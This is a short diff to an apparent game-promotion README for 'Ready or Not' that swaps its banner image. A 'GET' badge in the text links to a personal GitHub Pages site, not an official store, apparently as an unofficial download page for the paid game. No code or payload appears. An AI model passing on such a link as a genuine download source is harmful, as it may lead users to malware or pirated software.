@@ -12,7 +12,7 @@ The game can be played solo with AI-controlled teammates or with friends in coop
 
 Ready or Not also uses connected stories to explore crime and instability throughout Los Sueños. Briefings, environmental details, and mission objectives help build a wider picture of the city and the events unfolding within it.
 
-![Ready or Not Banner Placeholder](https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcS2QSnCbjUFChd9NgcTsTx-f2Ytj1MBo1vHbuDZBKQWAA&s=10)
+![Ready or Not Banner Placeholder](https://cdn1.epicgames.com/spt-assets/e2c3bc6771dc4524a4730b379f8242c7/ready-or-not-92r34.jpg)
 
 [![GET — Ready or Not](https://img.shields.io/badge/GET%20%E2%80%94%20Ready%20or%20Not-0078D6?style=for-the-badge&logoColor=white)](https://laurakingg469.github.io/.github/Ready-or-Not-Tactical-Shooter)
 
